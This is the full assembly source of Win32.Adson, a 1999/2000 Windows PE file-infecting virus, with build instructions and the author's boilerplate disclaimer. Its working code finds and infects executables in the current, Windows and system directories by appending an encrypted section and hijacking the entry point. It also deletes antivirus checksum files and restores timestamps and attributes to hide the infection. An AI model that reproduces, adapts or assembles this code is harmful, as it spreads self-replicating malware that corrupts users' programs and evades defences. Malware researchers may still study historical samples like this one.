; *************************************************************************
; ********************                                 ********************
; ********************           Win32.Adson           ********************
; ********************                by               ********************
; ********************            BLACK JACK           ********************
; ********************                                 ********************
; *************************************************************************

comment ~

NAME: Win32.Adson
AUTHOR: Black Jack /LineZer0 /Metaphase
TYPE: direct acting Win32 PE section appender
SIZE: 1703 bytes

DESCRIPTION: When an infected file is run, the virus searches for up to
             three PE *.EXE files in the current, windows and system
             directory. These files are infected then by adding a new
             section called ".Adson". The file modification is done by
             direct access, not by memory mapping. I know that these
             techniques are not considered the best ones for win32 virii,
             but fuck it, I just felt like doing it that way, with the only
             reason that I'm an individualist. But this won't be my last
             win32 virus, so maybe next time...
             BTW, I since this is my first PE appender, I would appreciate
             constructive critic, my e-mail is Black_Jack_lzo@hotmail.com

GOODIES: + fully Win32 compatible
         + encrypted with a DIV/MUL algorithm
         + traps possible errors with a SEH
         + directory traversal: infects current, windows and system dir
         + deletes various AV checksum files
         + restores Date/Time
         + kills Attributes before infections and restores them afterwards

ASSEMBLE WITH: 
                tasm32 /mx /m adson.asm
                tlink32 /Tpe /aa adson.obj,,, import32.lib

                there's no need for PEWRSEC or a similar tool, because the
                virus code is stored in the data section.

DISCLAIMER: I do *NOT* support the spreading of virii in the wild. There-
            fore, this source was only written for research and education.
            Please do not spread it. The author and his groups can't be
            hold responsible for what you decide to do with this source.
~
; ===========================================================================

length_virus_file       EQU (end_static - start)
length_virus_mem        EQU (end_mem - start)
length_encrypted        EQU (end_encrypted - encrypted)
length_PE_header        EQU 1000

Extrn MessageBoxA:Proc
Extrn ExitProcess:Proc

.386p
.model flat

.data
start:
        pushad                                  ; save registers and flags
        pushfd

        db 0BDh                                 ; mov ebp, imm32
delta_offset    dd 0                            ; our delta offset

        lea esi, [ebp+offset encrypted]         ; source to crypt
        mov edi, esi                            ; destination crypt buffer
        mov ecx, length_encrypted / 8           ; length to crypt in qwords
        db 0BBh                                 ; mov ebx, imm32
crypt_key       dd 0                            ; key to decrypt

decrypt:
        lodsd                                   ; load mod dword to EAX
        xchg eax, edx                           ; EDX=mod
        lodsd                                   ; load div dword to EAX
        cmp edx, ebx                            ; plaincode to big for div?
        JA no_mul                               ; if it was so, also no mul

        push ebx                                ; save crypt key
        push edx                                ; save mod dword

        mul ebx                                 ; EDX:EAX=EAX*EBX

        pop ebx                                 ; EBX=mod dword
        add eax, ebx                            ; add mod to multiplied
        adc edx, 0                              ; qword in EDX:EAX
        pop ebx                                 ; restore crypt key

        stosd                                   ; store low dword
        xchg eax, edx                           ; EDX=high dword
        stosd                                   ; store high dword

        LOOP decrypt                            ; loop till done

        JMP encrypted                           ; if done, start code
no_mul:
        stosd                                   ; store in reversed order
        xchg eax, edx
        stosd

        LOOP decrypt                            ; loop till done

encrypted:
        mov eax, [ebp+offset orig_eip]          ; fix jump to host
        mov [ebp+offset host_entry], eax

        push offset seh_handler                 ; push offset of new SEH
        push dword ptr fs:[0]                   ; push offset of old SEH
        mov fs:[0], esp                         ; set up SEH

        mov eax, [esp+11*4]                     ; EAX=somewhere inside k32

scan_kernel:
        cmp word ptr [eax], "ZM"                ; found an EXE header?
        JNE kernel_not_found                    ; if not, then scan on

        mov ebx, [eax+3Ch]                      ; new header RVA
        add ebx, eax                            ; RVA->VA
        cmp dword ptr [ebx], "EP"               ; is there a PE header?
        JE kernel32_found                       ; found KERNEL32.dll base!

kernel_not_found:
        dec eax                                 ; scan one byte down
        JMP scan_kernel                         ; and repeat till found

kernel32_found:
        mov [ebp+offset kernel32], eax          ; save kernel32.dll base
        mov ebx, [ebx+120]                      ; EBX=export table RVA
        add ebx, eax                            ; EBX=export table VA

        mov edx, [ebx+20h]                      ; API names ptr array RVA
        add edx, eax                            ; RVA->VA

        mov ecx, [ebx+18h]                      ; number of names

GPA_search:
        push ecx                                ; save number of names left

        mov esi, [edx]                          ; API name ptr RVA
        add esi, eax                            ; VA to API name
        lea edi, [ebp+offset GetProcAddress]    ; EDI=ptr "GetProcAddress"
        mov ecx, l_GPA                          ; length "GetProcAddress"
        cld                                     ; clear directory flag
        rep cmpsb                               ; compare the strings
        pop ecx                                 ; pop number of names left
        JE GPA_found                            ; GetProcAddress found?

        inc edx                                 ; check next API name
        inc edx
        inc edx
        inc edx

        LOOP GPA_search                         ; loop till found

GPA_not_found:
        JMP return_to_host                      ; ERROR!

GPA_found:
        mov edx, [ebx+18h]                      ; number of names
        sub edx, ecx                            ; EDX=index of GetProcAddr
        shl edx, 1                              ; EDX=EDX*2

        add edx, [ebx+24h]                      ; AddressOfOrdinals Array
        add edx, eax                            ; add kernel32 base address
        xor ecx, ecx                            ; ECX=0
        mov cx, [edx]                           ; Ordinal to ECX
        shl ecx, 2                              ; multiply with 4
        add ecx, [ebx+1Ch]                      ; add AdressOfFunctions
        add ecx, eax                            ; RVA->VA
        mov ebx, [ecx]                          ; EBX=GetProcAddress RVA!
        add ebx, eax                            ; EBX=GetProcAddress VA!!!

        mov [ebp+offset GPA_addr], ebx          ; save it!

                                                ; get current directory
        lea eax, [ebp+offset curdir]            ; where to store it
        push eax
        push 260                                ; length of buffer=260
        lea eax, [ebp+offset GetCurrentDirectoryA]
        call call_API                           ; call GetCurrentDirectoryA

                                                ; get Windows directory
        push 260                                ; length of buffer
        lea eax, [ebp+offset windir]            ; where to store it
        push eax
        lea eax, [ebp+offset GetWindowsDirectoryA]
        call call_API                           ; call GetWindowsDirectoryA

        lea eax, [ebp+offset windir]            ; change to windows dir
        push eax
        lea eax, [ebp+offset SetCurrentDirectoryA]
        call call_API                           ; call SetCurrentDirectoryA

        call infect_dir                         ; infect windows directory

                                                ; get System directory
        push 260                                ; lenth of buffer
        lea eax, [ebp+offset windir]            ; where to store it
        push eax
        lea eax, [ebp+offset GetSystemDirectoryA]
        call call_API                           ; call GetSystemDirectoryA

                                                ; change to system dir
        lea eax, [ebp+offset windir]
        push eax
        lea eax, [ebp+offset SetCurrentDirectoryA]
        call call_API                           ; call SetCurrentDirectoryA

        call infect_dir                         ; infect System directory

                                                ; go back to start dir
        lea eax, [ebp+offset curdir]            ; offset buffer
        push eax
        lea eax, [ebp+offset SetCurrentDirectoryA]
        call call_API                           ; call SetcurrentDirectoryA

        call infect_dir                         ; infect start directory

return_to_host:
        pop dword ptr fs:[0]                    ; restore old SEH
        pop eax                                 ; remove our SEH address

        popfd                                   ; restore flags & registers
        popad

        db 068h                                 ; push imm32
host_entry      dd 0
        ret                                     ; jump to host code

seh_handler:
        mov esp, [esp+8]                        ; restore ESP
        JMP return_to_host                      ; quit virus execution

; ----- INFECT A DIRECTORY ------------------------------------------------
infect_dir:
        mov dword ptr [ebp+infectioncount], 3   ; infect 3 files each dir

        lea eax, [ebp+offset anti_vir_dat]      ; delete ANTI-VIR.DAT
        call kill_file
        lea eax, [ebp+offset chklist_ms]        ; delete CHKLIST.MS
        call kill_file
        lea eax, [ebp+offset chklist_cps]       ; delete CHKLIST.CPS
        call kill_file
        lea eax, [ebp+offset avp_crc]           ; delete AVP.CRC
        call kill_file

        lea eax, [ebp+offset find_data]         ; address of FindData struc
        push eax
        lea eax, [ebp+offset filemask]          ; address of filemask
        push eax
        lea eax, [ebp+offset FindFirstFileA]
        call call_API                           ; call FindFirstFileA
        mov [ebp+offset search_handle], eax     ; store search handle
        inc eax                                 ; -1 means no files found
        JZ end_infect_dir                       ; no file found

infect:
        push 80h                                ; FILE_ATTRIBUTE_NORMAL
        lea eax, [ebp+offset FileName]
        push eax
        lea eax, [ebp+offset SetFileAttributesA]
        call call_API                           ; vaporize attributes

        push 0                                  ; template file hndl (shit)
        push 80h                                ; file attributes (normal)
        push 3                                  ; open existing file
        push 0                                  ; security attribs (shit)
        push 0                                  ; share mode (shit)
        push 0C0000000h                         ; read/write mode
        lea eax, [ebp+offset FileName]
        push eax                                ; offset FileName
        lea eax, [ebp+offset CreateFileA]
        call call_API
        mov [ebp+offset file_handle], eax       ; save filehandle
        inc eax
        JZ restore_attributes

        push 0                                  ; overlapped struct (shit)
        lea eax, [ebp+offset bytes_read]        ; number of bytes read
        push eax
        push 64                                 ; length to read (DOS hdr)
        lea eax, [ebp+offset dos_header]        ; offset of buffer
        push eax
        push [ebp+file_handle]                  ; file handle
        lea eax, [ebp+offset ReadFile]
        call call_API                           ; read victim's DOS header

        cmp word ptr [ebp+offset exe_marker], "ZM"       ; a true EXE?
        JNE close

        push 0                                  ; move method (beginning)
        push 0                                  ; high dword of ptr (shit)
        push dword ptr [ebp+offset new_header]  ; distance to move
        push dword ptr [ebp+offset file_handle] ; file handle
        lea eax, [ebp+offset SetFilePointer]
        call call_API

        push 0                                  ; overlapped struct (shit)
        lea eax, [ebp+offset bytes_read]        ; number of bytes read
        push eax
        push length_pe_header                   ; length to read (PE hdr)
        lea eax, [ebp+offset pe_header]         ; offset of buffer
        push eax
        push dword ptr [ebp+file_handle]        ; file handle
        lea eax, [ebp+offset ReadFile]
        call call_API                           ; read victim's PE header

        cmp dword ptr [ebp+offset pe_marker], "EP"      ; is it a PE file?
        JNE close

        test word ptr [ebp+offset flags], 0010000000000000b     ; DLL ?
        JNZ close

; ----- GET LAST SECTION HEADER -------------------------------------------

        lea ebx, [ebp+offset optional_header]           ; EBX=start of
        add bx, word ptr [ebp+offset SizeOfOptHeader]   ; object table

        xor eax, eax
        mov ax, word ptr [ebp+offset NumberOfSections]
        dec eax

        mov ecx, 40                             ; length of section header
        mul ecx

        add eax, ebx                            ; EAX=adr last section hdr
        mov edi, eax

        cmp dword ptr [edi], "sdA."             ; already infected?
        JE close                                ; if so, then close

; ----- UPDATE HEADER -----------------------------------------------------
        mov eax, [ebp+offset EntryPoint]        ; entry point RVA
        add eax, [ebp+offset ImageBase]         ; make an VA
        mov [ebp+offset orig_eip], eax          ; save it.

        inc word ptr [ebp+offset NumberOfSections]   ; one more section!

; ----- CALCULATE VIRTUAL ADDRESS OF VIRUS SECTION ------------------------
        mov eax, [edi+12]                       ; virtual address of sect.
        add eax, [edi+8]                        ; virtual size of section
        mov ebx, [ebp+offset SectionAlign]      ; align to EBX
        call align_EAX                          ; align section start
        mov [ebp+offset VirtualAddress], eax
        mov [ebp+offset EntryPoint], eax        ; new file entry point

; ----- CALCULATE DELTA OFFSET --------------------------------------------
        add eax, [ebp+offset ImageBase]         ; EIP at start
        sub eax, offset start                   ; subtract 1st gen org
        mov [ebp+offset delta_offset], eax      ; store delta offset

; ----- FIXUP SizeOfImage -------------------------------------------------
        mov eax, length_virus_mem               ; size of virus in memory
        call align_EAX                          ; align to SectionAlign
        add dword ptr [ebp+offset SizeOfImage], EAX     ; fixup SizeOfImage

; ----- CALCULATE START OF VIRUS SECTION IN FILE --------------------------
        mov eax, [edi+20]                       ; physical address of sect.
        add eax, [edi+16]                       ; add physical sect.-size
        mov ebx, [ebp+offset FileAlign]         ; EBX=FileAlign
        call align_EAX                          ; align virus start in file
        mov [ebp+offset PhysicalAddress], eax   ; save it

; ----- MOVE FILEPOINTER TO VIRUS LOCATION --------------------------------
        push 0                                  ; move method (beginning)
        push 0                                  ; high dword of ptr (shit)
        push eax                                ; distance to move
        push dword ptr [ebp+offset file_handle] ; file handle
        lea eax, [ebp+offset SetFilePointer]
        call call_API                           ; move FP to our new sect.

; ----- CALCULATE SIZE OF VIRUS IN FILE (ALIGNED) -------------------------
        mov eax, length_virus_file              ; length of virus in file
        call align_EAX                          ; align it to FileAlign
        mov [ebp+PhysicalSize], eax             ; save aligned sect.-size

; ----- ADD NEW SECTION HEADER --------------------------------------------
        mov ecx, 40                             ; length of a section hdr.
        lea esi, [ebp+offset new_section_header]
        add edi, ecx                            ; next section
        cld                                     ; clear carry flag
        pusha                                   ; save all registers
        xor eax, eax                            ; EAX=0
        repe scasb                              ; place for new sect. hdr?
        popa                                    ; restore registers
        JNE close

        rep movsb                               ; move new section header

        push eax                                ; save virus-size in file

        lea eax, [ebp+offset GetTickCount]      ; get new "random" cryptkey
        call call_API                           ; call GetTickCount

        mov ebx, eax                            ; move key to EBX
        ror eax, 8                              ; big keys encrypt better
        xor ebx, eax

        mov [ebp+offset crypt_key], ebx         ; save the key

        lea esi, [ebp+offset start]             ; source
        lea edi, [ebp+offset crypt_buffer]      ; destination
        mov ecx, length_virus_file              ; length to move
        rep movsb                               ; copy virus to crypt buf.

        lea esi, [ebp+offset crypt_buffer+(encrypted-start)]
        mov edi, esi
        mov cx, length_encrypted / 8            ; length to crypt (qwords)

encrypt:
        lodsd                                   ; load low dword to EAX
        xchg eax, edx                           ; low dword to EDX
        lodsd                                   ; load high dword to EAX
        xchg eax, edx                           ; EDX=hi dword, EAX=lo dwrd
        cmp edx, ebx                            ; qword too big for div?
        JA no_div                               ; yes? store qword reversed
        div ebx                                 ; EDX:EAX / EBX
                                                ; div = EAX; mod = EDX
no_div:
        xchg eax, edx                           ; EAX=mod
        stosd                                   ; store mod
        xchg eax, edx                           ; EAX=div
        stosd                                   ; store div
        loop  encrypt

        pop eax                                 ; restore virussize in file

; ----- WRITE VIRUS TO FILE -----------------------------------------------
        push 0                                  ; overlapped struct (shit)
        lea ecx, [ebp+offset bytes_read]        ; number of bytes written
        push ecx
        push eax                                ; write virus-size bytes
        lea eax, [ebp+offset crypt_buffer]      ; offset of buffer
        push eax
        push dword ptr [ebp+file_handle]        ; file handle
        lea eax, [ebp+offset WriteFile]
        call call_API                           ; call WriteFile

        push 0                                  ; move method (beginning)
        push 0                                  ; high dword ptr (shit)
        push dword ptr [ebp+offset new_header]  ; distance to move
        push dword ptr [ebp+offset file_handle] ; file handle
        lea eax, [ebp+offset SetFilePointer]
        call call_API                           ; call SetFilePointer

        push 0                                  ; overlapped struct (shit)
        lea eax, [ebp+offset bytes_read]        ; number of bytes written
        push eax
        push length_pe_header                   ; length to write (PE hdr)
        lea eax, [ebp+offset pe_header]         ; offset of buffer
        push eax
        push dword ptr [ebp+file_handle]        ; file handle
        lea eax, [ebp+offset WriteFile]
        call call_API                           ; write victim's new PE hdr

        dec dword ptr [ebp+infectioncount]      ; one more file infected

close:
        lea eax, [ebp+offset LastWriteTime]
        push eax
        lea eax, [ebp+offset LastAccessTime]
        push eax
        lea eax, [ebp+offset CreationTime]
        push eax
        push dword ptr [ebp+offset file_handle]
        lea eax, [ebp+offset SetFileTime]
        call call_API                           ; restore old file times

        push dword ptr [ebp+offset file_handle] ; close the handle of file
        lea eax, [ebp+offset CloseHandle]
        call call_API                           ; write victim's new PE hdr

restore_attributes:
        push dword ptr [ebp+offset FileAttributes]
        lea eax, [ebp+offset FileName]
        push eax
        lea eax, [ebp+offset SetFileAttributesA]
        call call_API                           ; restore old attributes

find_next:
        mov ecx, [ebp+infectioncount]           ; ECX=infection counter
        JCXZ close_find                         ; enough files infected?

        lea eax, [ebp+offset find_data]         ; offset of find data struc
        push eax
        push dword ptr [ebp+offset search_handle] ; our search handle
        lea eax, [ebp+offset FindNextFileA]
        call call_API                           ; find next file
        dec eax                                 ; EAX=1 if file found
        JZ infect                               ; if file found, infect it

close_find:
        push dword ptr [ebp+offset search_handle]  ; close the filefinding
        lea eax, [ebp+offset FindClose]
        call call_API                           ; call FindClose
end_infect_dir:
        ret

; ----- DELETE A FILE WITH ANY ATTRIBUTE ----------------------------------
kill_file:
        push eax                                ; filename offset (for del)

                                                ; reset file attributes
        push 80h                                ; attributes: normal file
        push eax                                ; filename offset
        lea eax, [ebp+offset SetFileAttributesA]
        call call_API                           ; call SetFileAttributesA

        lea eax, [ebp+offset DeleteFileA]
        call call_API                           ; call DeleteFileA

        RET

; ----- GET AN API ADDRESS AND CALL IT ------------------------------------
call_API:
        push eax                                ; offset name of API
        push dword ptr [ebp+offset kernel32]    ; KERNEL32 base address
        call [ebp+offset GPA_addr]              ; call GetProcAddress API
        JMP eax                                 ; jmp to API

; ----- ALIGNS EAX TO EBX -------------------------------------------------
align_EAX:
        xor edx, edx                            ; zero out high dword
        div ebx                                 ; divide
        or edx, edx                             ; remainer zero?
        JZ no_round_up                          ; if so, don't round up
        inc eax                                 ; round up
no_round_up:
        mul ebx                                 ; multiply again
        RET

end_code:

copyright       db "Win32.Adson (c) Black Jack /LineZer0 /Metaphase", 0
                db "this virus was written in Austria in 1999/2000", 0

GetProcAddress       db "GetProcAddress", 0
l_GPA                = $ - offset GetProcAddress

FindFirstFileA       db "FindFirstFileA", 0
FindNextFileA        db "FindNextFileA", 0
FindClose            db "FindClose", 0
CreateFileA          db "CreateFileA", 0
CloseHandle          db "CloseHandle", 0
ReadFile             db "ReadFile", 0
WriteFile            db "WriteFile", 0
DeleteFileA          db "DeleteFileA", 0
SetFilePointer       db "SetFilePointer", 0
SetFileAttributesA   db "SetFileAttributesA", 0
SetFileTime          db "SetFileTime", 0
SetCurrentDirectoryA db "SetCurrentDirectoryA", 0
GetCurrentDirectoryA db "GetCurrentDirectoryA", 0
GetWindowsDirectoryA db "GetWindowsDirectoryA", 0
GetSystemDirectoryA  db "GetSystemDirectoryA", 0
GetTickCount         db "GetTickCount", 0

anti_vir_dat    db "ANTI-VIR.DAT", 0
chklist_ms      db "CHKLIST.MS", 0
chklist_cps     db "CHKLIST.CPS", 0
avp_crc         db "AVP.CRC", 0

orig_eip        dd offset quit_1st_gen
filemask        db "*.EXE", 0

new_section_header:
                db ".Adson", 0, 0               ; section name
VirtualSize     dd length_virus_mem
VirtualAddress  dd 0
PhysicalSize    dd length_virus_file
PhysicalAddress dd 0
                dd 0, 0, 0                      ; reserved for debugger
                dd 0E0000020h                 ; flags: code,exec,read,write

if ((($-encrypted) mod 8) NE 0)                 ; align 8
        db (8-(($-encrypted) mod 8)) dup(0)
endif

end_encrypted:

end_static:

heap:

crypt_buffer     db length_virus_file dup(?)

padding          db 1024 dup(?)

windir           db 260 dup(?)
curdir           db 260 dup(?)

kernel32         dd ?
GPA_addr         dd ?

search_handle    dd ?
file_handle      dd ?
bytes_read       dd ?
infectioncount   dd ?

find_data:
FileAttributes   dd ?
CreationTime     dq ?
LastAccessTime   dq ?
LastWriteTime    dq ?
FileSize         dq ?
wfd_reserved     dq ?
FileName         db 260 dup(?)
DosFileName      db 14 dup(?)

dos_header:
exe_marker       dw ?
dosheader_shit   db 58 dup(?)
new_header       dd ?

pe_header:
pe_marker        dd ?
machine          dw ?
NumberOfSections dw ?
TimeDateStamp    dd ?
DebugShit        dq ?
SizeOfOptHeader  dw ?
flags            dw ?
optional_header:
optional_magic   dw ?
linkerversion    dw ?
SizeOfCode       dd ?
SizeOfDATA       dd ?
SizeOfBSS        dd ?
EntryPoint       dd ?
BaseOfCode       dd ?
BaseOfData       dd ?
ImageBase        dd ?
SectionAlign     dd ?
FileAlign        dd ?
OSVersion        dd ?
OurVersion       dd ?
SubVersion       dd ?
reserved1        dd ?
SizeOfImage      dd ?
SizeOfHeader     dd ?
Checksum         dd ?

org offset pe_header+length_pe_header

end_mem:

; ----- CODE SECTION WITH FIRST GENERATION DROPPER ------------------------
.code
start_1st_gen:
        pushad
        pushfd

        xor ebp, ebp                            ; delta offset for firstgen

        JMP encrypted                           ; jump over decryptor

quit_1st_gen:
        push 0
        push offset caption
        push offset message
        push 0
        call MessageBoxA

        push 0
        call ExitProcess

caption
db "Win32.Adson Virus (c) 1999/2000 Black Jack /LineZer0 /Metaphase"
        db 0
message db "first generation dropper", 0

end start_1st_gen
